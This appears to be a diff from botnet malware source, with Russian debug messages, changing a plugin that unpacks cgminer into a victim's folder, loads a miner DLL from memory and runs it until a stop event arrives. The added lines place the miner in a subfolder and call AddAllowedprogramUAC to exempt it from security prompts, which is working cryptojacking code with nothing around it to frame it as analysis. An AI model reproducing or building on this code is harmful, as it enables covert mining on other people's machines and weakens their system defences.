@@ -51,10 +51,14 @@ static DWORD WINAPI ProcessBitcoin(void*)
 		DbgBtc( "Сохранили btcm.plug в %s", tempCab );
 		GetBitcoinFolder(folderBitcoin);
 		pCreateDirectoryA( folderBitcoin, 0 );
+		pPathAppendA( folderBitcoin, "miner" );
 		bool res = ExtractCab( tempCab, folderBitcoin );
 		DeleteFileA(tempCab);
 		if( res )
 		{
+			pPathAppendA( folderBitcoin, "cgminer.exe" );
+			AddAllowedprogramUAC(folderBitcoin);
+			//добавляем в список искл
 			DbgBtc( "Распаковали cgmimer в папку %s", folderBitcoin );
 			TMemoryDLL btc(btcDll);
 			typeInit Init = (typeInit)btc.GetProcAddress("InitMiner");
@@ -73,7 +77,6 @@ static DWORD WINAPI ProcessBitcoin(void*)
 					m_lstrcat( urls, E.Line().t_str() );
 				}
 
-				pPathAppendA( folderBitcoin, "cgminer.exe" );
 				wchar_t* folderBitcoinW = AnsiToUnicode( folderBitcoin, 0 );
 
 				DbgBtc( "Вызываем InitMiner(%s, %ls)", urls, folderBitcoinW );
@@ -83,6 +86,7 @@ static DWORD WINAPI ProcessBitcoin(void*)
 				string fileFlag = BOT::MakeFileName( 0, flagBitcoinRunned );
 				File::WriteBufferA( fileFlag.t_str(), 0, 0 );
 				HANDLE hevent = pCreateEventA( 0, 0, 0, eventStopBitcoin );
+				pResetEvent(hevent);
 				//ждем пока не поступит команда на остановку
 				pWaitForSingleObject( hevent, INFINITE );
 				Stop();
@@ -112,6 +116,7 @@ static void DeleteBitcoinPlugin()
 	char folderBitcoin[MAX_PATH];
 	m_memset( folderBitcoin, 0, sizeof(folderBitcoin) );
 	GetBitcoinFolder(folderBitcoin);
+	pPathAppendA( folderBitcoin, "miner" );
 	DeleteFolders(folderBitcoin);
 	Plugin::DeleteFromCache((char*)nameBtcmCab);
 	Plugin::DeleteFromCache((char*)nameBtcDll);
